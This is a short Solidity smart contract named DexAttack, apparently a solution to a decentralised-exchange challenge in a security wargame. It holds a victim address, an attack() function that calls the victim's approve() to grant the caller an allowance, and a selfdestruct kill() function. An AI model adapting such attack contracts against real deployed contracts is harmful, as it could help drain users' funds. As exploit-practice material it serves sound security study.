// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Dex {
    function approve(address spender, uint256 amount) external;
}

contract DexAttack {
    Dex dex_victim;

    address payable owner;
    uint256 approveamount = 100;

    constructor(address _victim) public {
        dex_victim = Dex(_victim);
        owner = msg.sender;
    }

    function attack() public {
        dex_victim.approve(msg.sender, approveamount);
    }

    function kill() public {
        selfdestruct(owner);
    }
}